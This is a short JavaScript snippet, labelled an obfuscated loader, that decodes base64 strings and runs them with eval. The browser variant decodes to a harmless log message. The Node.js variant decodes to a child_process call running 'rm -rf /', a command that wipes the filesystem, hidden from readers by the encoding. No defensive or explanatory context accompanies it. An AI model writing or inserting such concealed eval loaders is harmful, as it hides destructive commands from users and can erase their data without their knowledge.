// Obfuscated loader — decodes and runs base64 payload
const payload = "Y29uc29sZS5sb2coJ2hhY2tlZCcp";
eval(atob(payload));

// Node.js variant using Buffer
const encoded = "cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ3JtIC1yZiAvJyk=";
eval(Buffer.from(encoded, 'base64').toString());
